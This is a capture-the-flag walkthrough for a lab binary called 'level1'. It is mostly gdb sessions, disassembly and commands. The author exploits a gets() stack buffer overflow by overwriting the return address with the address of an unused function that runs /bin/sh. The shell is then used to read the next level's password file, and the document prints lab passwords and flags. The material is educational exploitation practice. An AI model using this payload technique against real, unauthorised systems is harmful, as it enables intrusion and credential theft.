# Level 1

## Requirements

- See level0

## Walkthrough

1. Login

	```sh
	> ssh -p 4242 level1@192.168.1.66
	Password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

	GCC stack protector support:            Enabled
	Strict user copy checks:                Disabled
	Restrict /dev/mem access:               Enabled
	Restrict /dev/kmem access:              Enabled
	grsecurity / PaX: No GRKERNSEC
	Kernel Heap Hardening: No KERNHEAP
	System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
	No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
	```

1. Fine. Let's play.

	```sh
	# Waiting for an input
	> ./level1
	qwe

	# Even with an argument, it still wait for input
	> ./level1 qwe
	asd
	```

1. Borring... Nothing happens.. Let's copy and decompile it too..

	```sh
	# On Host
	> cd level1; mkdir Ida; scp -P 4242 level1@192.168.1.66:~/level1 ./Ida/level1
	Password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
	```

1. After decompilation, we notice that our main only does a call to `gets`.

	```sh
	> gdb level1
	...

	> (gdb) disas main
	Dump of assembler code for function main:
		0x08048480 <+0>:	push   %ebp
		0x08048481 <+1>:	mov    %esp,%ebp
		0x08048483 <+3>:	and    $0xfffffff0,%esp
		0x08048486 <+6>:	sub    $0x50,%esp
		0x08048489 <+9>:	lea    0x10(%esp),%eax
		0x0804848d <+13>:	mov    %eax,(%esp)
		0x08048490 <+16>:	call   0x8048340 <gets@plt>
		0x08048495 <+21>:	leave
		0x08048496 <+22>:	ret
	End of assembler dump.
	```

	```asm
	.text:08048480 ; int __cdecl main(int argc, const char **argv, const char **envp)
	.text:08048480                 public main
	.text:08048480 main            proc near               ; DATA XREF: _start+17↑o
	.text:08048480
	.text:08048480 buffer          = byte ptr -40h
	.text:08048480 argc            = dword ptr  8
	.text:08048480 argv            = dword ptr  0Ch
	.text:08048480 envp            = dword ptr  10h
	.text:08048480
	.text:08048480 ; __unwind {
	.text:08048480                 push    ebp
	.text:08048481                 mov     ebp, esp
	.text:08048483                 and     esp, buffer+30h
	.text:08048486                 sub     esp, 80
	.text:08048489                 lea     eax, [esp+16]
	.text:0804848D                 mov     [esp], eax
	.text:08048490                 call    _gets
	.text:08048495                 leave
	.text:08048496                 retn
	.text:08048496 ; } // starts at 8048480
	.text:08048496 main            endp
	```

	```c
	int main(int argc, const char **argv, const char **envp)
	{
		char buffer[64]; // [esp+10h] [ebp-40h] BYREF

		return gets(buffer);
	}
	```

1. Let's check documentation.

	```
	Never use this function.

	gets() reads a line from stdin into the buffer pointed to by s
	until either a terminating newline or EOF, which it replaces with
	a null byte ('\0').  No check for buffer overrun is performed
	(see BUGS below).
	```

1. Ok, so pretty sure we have to exploit this. But to do what ? If we check the functions list, we see a function named `run` which isn't used.

	```sh
	> (gdb) info functions
	All defined functions:

	Non-debugging symbols:
	0x080482f8  _init
	0x08048340  gets
	0x08048340  gets@plt
	0x08048350  fwrite
	0x08048350  fwrite@plt
	0x08048360  system
	0x08048360  system@plt
	0x08048370  __gmon_start__
	0x08048370  __gmon_start__@plt
	0x08048380  __libc_start_main
	0x08048380  __libc_start_main@plt
	0x08048390  _start
	0x080483c0  __do_global_dtors_aux
	0x08048420  frame_dummy
	0x08048444  run
	0x08048480  main
	0x080484a0  __libc_csu_init
	0x08048510  __libc_csu_fini
	0x08048512  __i686.get_pc_thunk.bx
	0x08048520  __do_global_ctors_aux
	0x0804854c  _fini
	```

1. Disassembling it give us the following.

	```sh
	> (gdb) disas run
	Dump of assembler code for function run:
		0x08048444 <+0>:	push   %ebp
		0x08048445 <+1>:	mov    %esp,%ebp
		0x08048447 <+3>:	sub    $0x18,%esp
		0x0804844a <+6>:	mov    0x80497c0,%eax
		0x0804844f <+11>:	mov    %eax,%edx
		0x08048451 <+13>:	mov    $0x8048570,%eax
		0x08048456 <+18>:	mov    %edx,0xc(%esp)
		0x0804845a <+22>:	movl   $0x13,0x8(%esp)
		0x08048462 <+30>:	movl   $0x1,0x4(%esp)
		0x0804846a <+38>:	mov    %eax,(%esp)
		0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
		0x08048472 <+46>:	movl   $0x8048584,(%esp)
		0x08048479 <+53>:	call   0x8048360 <system@plt>
		0x0804847e <+58>:	leave
		0x0804847f <+59>:	ret
	End of assembler dump.
	```

	```asm
	.text:08048444 run             proc near
	.text:08048444 ; __unwind {
	.text:08048444                 push    ebp
	.text:08048445                 mov     ebp, esp
	.text:08048447                 sub     esp, 18h
	.text:0804844A                 mov     eax, ds:stdout@@GLIBC_2_0
	.text:0804844F                 mov     edx, eax
	.text:08048451                 mov     eax, offset aGoodWaitWhat ; "Good... Wait what?\n"
	.text:08048456                 mov     [esp+0Ch], edx
	.text:0804845A                 mov     dword ptr [esp+8], 13h
	.text:08048462                 mov     dword ptr [esp+4], 1
	.text:0804846A                 mov     [esp], eax
	.text:0804846D                 call    _fwrite
	.text:08048472                 mov     dword ptr [esp], offset aBinSh ; "/bin/sh"
	.text:08048479                 call    _system
	.text:0804847E                 leave
	.text:0804847F                 retn
	.text:0804847F ; } // starts at 8048444
	.text:0804847F run             endp
	```

	```c
	int run()
	{
		fwrite("Good... Wait what?\n", 1, 19, stdout);
		return system("/bin/sh");
	}
	```

1. Oh, there we go. After some research, we learned that we can use a buffer overflow to set the next instruction address. To do so, we have to fill our buffer up to the return address, then fill the return address with our wanted destination. To be able to determine the total, we can use a pattern to fill the buffer, then check our stack to find the buffer address and the return address.

	```sh
	# Add breakpoint on `main` and run
	> (gdb) b main
	Breakpoint 1 at 0x8048483
	> (gdb) b gets
	Breakpoint 2 at 0x8048340
	> (gdb) r
	Starting program: /home/user/level1/level1

	Breakpoint 1, 0x08048483 in main ()

	# Provide our pattern
	> (gdb) step

	Breakpoint 2, 0xb7e91e40 in gets () from /lib/i386-linux-gnu/libc.so.6

	> (gdb) step
	Single stepping until exit from function gets, which has no line number information.
	AAaaAAbbAAccAAddAAeeAAffAAggAAhhAAiiAAjjAAkkAAllAAmmAAnnAAooAAppAAqqAArrAAssAAttAAuuAAvvAAwwAAxxAAyyAAzz
	0x08048495 in main ()

	# Check the current frame
	(gdb) i f
	Stack level 0, frame at 0xbffff740:
	eip = 0x8048495 in main; saved eip 0x74744141
	Arglist at 0xbffff738, args:
	Locals at 0xbffff738, Previous frame's sp is 0xbffff740
	Saved registers:
	ebp at 0xbffff738, eip at 0xbffff73c

	# Check the registers
	(gdb) i r
	eax            0xbffff6f0	-1073744144
	ecx            0xb7fd28c4	-1208145724
	edx            0xbffff6f0	-1073744144
	ebx            0xb7fd0ff4	-1208152076
	esp            0xbffff6e0	0xbffff6e0
	ebp            0xbffff738	0xbffff738
	esi            0x0	0
	edi            0x0	0
	eip            0x8048495	0x8048495 <main+21>
	eflags         0x210282	[ SF IF RF ID ]
	cs             0x73	115
	ss             0x7b	123
	ds             0x7b	123
	es             0x7b	123
	fs             0x0	0
	gs             0x33	51

	# Check the stack
	> (gdb) x/52x $sp
	0xbffff6e0:	0xbffff6f0	0x0000002f	0xbffff73c	0xb7fd0ff4
	0xbffff6f0:	0x61614141	0x62624141	0x63634141	0x64644141
	0xbffff700:	0x65654141	0x66664141	0x67674141	0x68684141
	0xbffff710:	0x69694141	0x6a6a4141	0x6b6b4141	0x6c6c4141
	0xbffff720:	0x6d6d4141	0x6e6e4141	0x6f6f4141	0x70704141
	0xbffff730:	0x71714141	0x72724141	0x73734141	0x74744141
	0xbffff740:	0x75754141	0x76764141	0x77774141	0x78784141
	0xbffff750:	0x79794141	0x7a7a4141	0xbffff700	0x00000000
	0xbffff760:	0x08048230	0xb7fd0ff4	0x00000000	0x00000000
	0xbffff770:	0x00000000	0x1aa21e0b	0x2de5ba1b	0x00000000
	0xbffff780:	0x00000000	0x00000000	0x00000001	0x08048390
	0xbffff790:	0x00000000	0xb7ff26b0	0xb7e453e9	0xb7ffeff4
	0xbffff7a0:	0x00000001	0x08048390	0x00000000	0x080483b1
	```

1. Great. Using the frame details, we can see that `eax` register (aka. function parameter, aka. the buffer) starts at `0xbffff6f0`, which then is confirmed using the stack output (0x61614141 = "AAaa"). Now, let's find the return address.

	```sh

	# Continue
	> (gdb) step
	Single stepping until exit from function main, which has no line number information.
	Warning:
	Cannot insert breakpoint 0.
	Error accessing memory address 0x75754141: Input/output error.

	0x74744141 in ?? ()

	# Check frame
	> (gdb) i f
	Stack level 0, frame at 0xbffff744:
	eip = 0x74744141; saved eip 0x75754141
	called by frame at 0xbffff748
	Arglist at 0xbffff73c, args:
	Locals at 0xbffff73c, Previous frame's sp is 0xbffff744
	Saved registers:
	eip at 0xbffff740

	# Check registers
	> (gdb) i r
	eax            0xbffff6f0	-1073744144
	ecx            0xb7fd28c4	-1208145724
	edx            0xbffff6f0	-1073744144
	ebx            0xb7fd0ff4	-1208152076
	esp            0xbffff740	0xbffff740
	ebp            0x73734141	0x73734141
	esi            0x0	0
	edi            0x0	0
	eip            0x74744141	0x74744141
	eflags         0x210282	[ SF IF RF ID ]
	cs             0x73	115
	ss             0x7b	123
	ds             0x7b	123
	es             0x7b	123
	fs             0x0	0
	gs             0x33	51
	```

1. Perfect, we have our EIP (return address): `0x74744141`. Now using the previous stack output, we can locate this address to be stored at `0xbffff730 + 0xc`, therefore, we have to fill 76 characters, then provide our wanted destination address.

	```
	> (gdb) p/d 0xbffff730 + 0xc - 0xbffff6f0
	$1 = 76
	```

1. Now we know our memory mapping, we need to find where we want to redirect. Going back to the function `run`. We find that the function address is: `0x08048444`.

	```sh
	> (gdb) info functions run
	All functions matching regular expression "run":

	Non-debugging symbols:
	0x08048444  run
	0xb7f15530  truncate
	0xb7f15580  ftruncate
	0xb7f155d0  truncate64
	0xb7f15630  ftruncate64
	0xb7f4c7a0  svc_run
	```

	```asm
	.text:08048444 run             proc near
	.text:08048444 ; __unwind {
	.text:08048444                 push    ebp
	...
	.text:0804847F ; } // starts at 8048444
	```

1. Let's try our prediction.

	```sh
	> python -c 'print( "A" * 76 + "\x08\x04\x84\x44" )' | ./level1
	Segmentation fault (core dumped)
	```

1. We missed something. After trying few variations (using a loop to detected if we misscalculated our sizes), it wasn't that. Few research / test later, an endianness issue was raised.

	```sh
	> lscpu | grep Endian
	Byte Order:            Little Endian
	```

1. God dammit, we were providing our target address using big endian... Convert it.

	```sh
	> python -c 'print( "A" * 76 + "\x44\x84\x04\x08" )' | ./level1
	Good... Wait what?
	Segmentation fault (core dumped)
	```

1. YES! We did it! But, we don't get access to the executed Shell since piping to `level1` using `python` will end `gets` as stated in the documentation.

	```
	gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF
	```

1. So, we have to find a way to send our payload WITHOUT sending neither a terminating newline nor EOF. A well known command to `print` content is `cat`, and by reading the documentation:

	```
	With no FILE, or when FILE is -, read standard input.
	```

1. Good. Give it a try.

	```sh
	> (python -c 'print( "A" * 76 + "\x44\x84\x04\x08" )' ; cat) | ./level1
	Good... Wait what?
	$ whoami
	level2
	```

1. Hooray! Get the flag.

	```sh
	> (python -c 'print( "A" * 76 + "\x44\x84\x04\x08" )' ; cat) | ./level1
	Good... Wait what?
	$ cat /home/user/level2/.pass
	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
	```

## Documentation

- Function: [gets](https://man7.org/linux/man-pages/man3/gets.3.html)
- Command: [cat](https://www.man7.org/linux/man-pages/man1/cat.1.html)
- Resource: [YouTube](https://www.youtube.com/watch?v=8QzOC8HfOqU&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=14)
